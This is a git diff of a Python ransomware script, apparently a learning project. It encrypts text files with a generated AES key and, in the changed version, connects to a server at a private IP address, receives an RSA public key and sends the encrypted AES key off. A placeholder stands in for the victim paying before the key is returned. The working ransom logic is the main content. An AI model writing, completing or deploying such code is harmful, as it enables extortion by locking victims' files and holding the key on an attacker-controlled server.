@@ -47,19 +47,13 @@ def save_key(key, file_name='Key.key'):
     with open(file_path, 'wb') as f:
         f.write(key)
 
-def generate_RSA_keys():
-    key = RSA.generate(2048)
-    private_key = key.export_key()
-    public_key = key.publickey().export_key()
-    return public_key, private_key
 
-def save_RSA_keys(public_key, private_key):
+def read_key(file_name='Key.key'):
     desktop_path = os.path.expanduser("~/Desktop")
-    with open(desktop_path + "/keyPair.key", "wb") as f:
-        f.write(public_key)
-        f.write(b"\n")
-        f.write(private_key)
-
+    file_path = os.path.join(desktop_path, file_name)
+    with open(file_path, 'rb') as f:
+        key = f.read()
+    return key
 def encrypt_using_public(public_key, message):
     pk = RSA.import_key(public_key)
     cipher = PKCS1_OAEP.new(pk)
@@ -71,13 +65,6 @@ def decrypt_using_private(private_key, ciphertext):
     cipher = PKCS1_OAEP.new(pvk)
     plaintext = cipher.decrypt(ciphertext)
     return plaintext
-def read_key(file_name='Key.key'):
-    desktop_path = os.path.expanduser("~/Desktop")
-    file_path = os.path.join(desktop_path, file_name)
-    with open(file_path, 'rb') as f:
-        key = f.read()
-    return key
-
 
 key = generate_key(16)
 bytes_key = key.encode('utf-8')
@@ -89,34 +76,36 @@ for file_path in txt_files:
     encrypt_file(file_path, bytes_key)
 
 save_key(bytes_key)
-public_key, private_key = generate_RSA_keys()
-save_RSA_keys(public_key, private_key)
 
-encrypted_files = find_all_encrypted_files()
-
-
-encrypted_key = encrypt_using_public(public_key=public_key, message=bytes_key)
-
-#save encrypted key to desktop
-save_key(encrypted_key,'encryptedKey.key')
-print(encrypted_key)
-print(read_key('encryptedKey.key'))
 #plaintext = decrypt_using_private(private_key=private_key, ciphertext=encrypted_key)
 #print (plaintext)
 
 #connect to the server and send the encrypted key to it
 SERVER_IP = '172.20.10.2'
-SERVER_PORT = 5678        
-with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
-     s.connect((SERVER_IP, SERVER_PORT))
-     data = s.recv(1024)
-     print(data)
-     s.send(encrypted_key)
-#input() For inputing
+SERVER_PORT = 5678 
+#connect to the server
+server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server_socket.connect((SERVER_IP, SERVER_PORT))
 
-#Note: the following is needed in order to decrypt the AES key
-#bytes_decrypted_key = decrypt_using_private(private_key=private_key, ciphertext=encrypted_key)
-#AES_key = bytes_decrypted_key.decode('utf-8')
-#print(key)
-#print(AES_key)
-#print(key==AES_key)
+# Request public key from server
+public_key = server_socket.recv(1024).decode()
+print("Received public key:", public_key)
+
+# Send "SUIII" message to server
+server_socket.send(encrypt_using_public(public_key=public_key, message=bytes_key))
+
+
+#simulate that the user paid (I will put some dummy operations for now)
+x=2+2
+y=3+3
+
+#request decrypted AES key from the server
+AES_key_received = server_socket.recv(1024).decode()
+#if this prints true, then the process is successful
+print(AES_key_received==key) #key is the original AES key
+
+
+#decrypt all files
+
+server_socket.close()
+
